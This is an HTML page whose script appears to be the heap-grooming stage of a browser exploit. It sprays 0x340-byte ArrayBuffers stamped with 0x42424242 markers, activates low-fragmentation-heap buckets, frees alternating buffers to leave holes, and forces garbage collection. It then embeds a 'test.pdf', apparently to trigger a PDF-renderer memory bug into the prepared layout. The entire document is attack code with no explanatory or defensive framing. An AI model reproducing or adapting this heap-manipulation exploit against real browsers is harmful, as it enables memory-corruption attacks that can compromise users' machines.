<script>
var controlledBuffer1 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array1 = new Int32Array(controlledBuffer1, 0x328) // set offset to 0x328
int32Array1[0] = 0x42424242;
int32Array1[1] = 0x42424242;

var controlledBuffer2 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array2 = new Int32Array(controlledBuffer2, 0x328) // set offset to 0x328
int32Array2[0] = 0x42424242;
int32Array2[1] = 0x42424242;

var controlledBuffer3 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array3 = new Int32Array(controlledBuffer3, 0x328) // set offset to 0x328
int32Array3[0] = 0x42424242;
int32Array3[1] = 0x42424242;

var controlledBuffer4 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array4 = new Int32Array(controlledBuffer4, 0x328) // set offset to 0x328
int32Array4[0] = 0x42424242;
int32Array4[1] = 0x42424242;

var controlledBuffer5 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array5 = new Int32Array(controlledBuffer5, 0x328) // set offset to 0x328
int32Array5[0] = 0x42424242;
int32Array5[1] = 0x42424242;

var controlledBuffer6 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array6 = new Int32Array(controlledBuffer6, 0x328) // set offset to 0x328
int32Array6[0] = 0x42424242;
int32Array6[1] = 0x42424242;

var controlledBuffer7 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array7 = new Int32Array(controlledBuffer7, 0x328) // set offset to 0x328
int32Array7[0] = 0x42424242;
int32Array7[1] = 0x42424242;

var controlledBuffer8 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array8 = new Int32Array(controlledBuffer8, 0x328) // set offset to 0x328
int32Array8[0] = 0x42424242;
int32Array8[1] = 0x42424242;

var controlledBuffer9 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array9 = new Int32Array(controlledBuffer9, 0x328) // set offset to 0x328
int32Array9[0] = 0x42424242;
int32Array9[1] = 0x42424242;

var controlledBuffer10 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array10 = new Int32Array(controlledBuffer10, 0x328) // set offset to 0x328
int32Array10[0] = 0x42424242;
int32Array10[1] = 0x42424242;

var controlledBuffer11 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array11 = new Int32Array(controlledBuffer11, 0x328) // set offset to 0x328
int32Array11[0] = 0x42424242;
int32Array11[1] = 0x42424242;

var controlledBuffer12 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array12 = new Int32Array(controlledBuffer12, 0x328) // set offset to 0x328
int32Array12[0] = 0x42424242;
int32Array12[1] = 0x42424242;

var controlledBuffer13 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array13 = new Int32Array(controlledBuffer13, 0x328) // set offset to 0x328
int32Array13[0] = 0x42424242;
int32Array13[1] = 0x42424242;

var controlledBuffer14 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array14 = new Int32Array(controlledBuffer14, 0x328) // set offset to 0x328
int32Array14[0] = 0x42424242;
int32Array14[1] = 0x42424242;

var controlledBuffer15 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array15 = new Int32Array(controlledBuffer15, 0x328) // set offset to 0x328
int32Array15[0] = 0x42424242;
int32Array15[1] = 0x42424242;

alert("Step 1 completed");

lfhBucketActivations = []
for (var blockSize = 0x1 ; blockSize <= 0x320 ; blockSize++) {
    console.log(blockSize);
    for (var j = 0 ; j < 17; j++) {
        lfhBucketActivations.push(new ArrayBuffer(blockSize)); // step 2
    }
}

alert("Step 2 completed");

let useThemBuffers1 = int32Array1
console.log(useThemBuffers1)
let useThemBuffers2 = controlledBuffer1
console.log(useThemBuffers2)

controlledBuffer2 = null;
int32Array2 = null

let useThemBuffers3 = int32Array3
console.log(useThemBuffers3)
let useThemBuffers4 = controlledBuffer3
console.log(useThemBuffers4)

controlledBuffer4 = null;
int32Array4 = null

let useThemBuffers5 = int32Array5
console.log(useThemBuffers5)
let useThemBuffers6 = controlledBuffer5
console.log(useThemBuffers6)

controlledBuffer6 = null;
int32Array6 = null

let useThemBuffers7 = int32Array7
console.log(useThemBuffers7)
let useThemBuffers8 = controlledBuffer7
console.log(useThemBuffers8)

controlledBuffer8 = null;
int32Array8 = null

let useThemBuffers9 = int32Array9
console.log(useThemBuffers9)
let useThemBuffers10 = controlledBuffer9
console.log(useThemBuffers10)

controlledBuffer10 = null;
int32Array10 = null

let useThemBuffers11 = int32Array11
console.log(useThemBuffers11)
let useThemBuffers12 = controlledBuffer11
console.log(useThemBuffers12)

controlledBuffer12 = null;
int32Array12 = null

let useThemBuffers13 = int32Array13
console.log(useThemBuffers13)
let useThemBuffers14 = controlledBuffer13
console.log(useThemBuffers14)

controlledBuffer14 = null;
int32Array14 = null

let useThemBuffers15 = int32Array15
console.log(useThemBuffers15)
let useThemBuffers16 = controlledBuffer15
console.log(useThemBuffers16)

let largeBuffer = new ArrayBuffer(192 * 1024 * 1024); // trigger garbage collection

setTimeout(() => {
    alert("Step 3 completed!!!");

    // Create the first set of elements
    var h1_2 = document.createElement("h1");
    var embed_2 = document.createElement("embed");

    h1_2.textContent = "test pdf";
    embed_2.src = "test.pdf";
    embed_2.width = "25px";
    embed_2.height = "25px";

    document.body.appendChild(h1_2);
    document.body.appendChild(embed_2);
}, 2000); 
</script>
<div>
</div>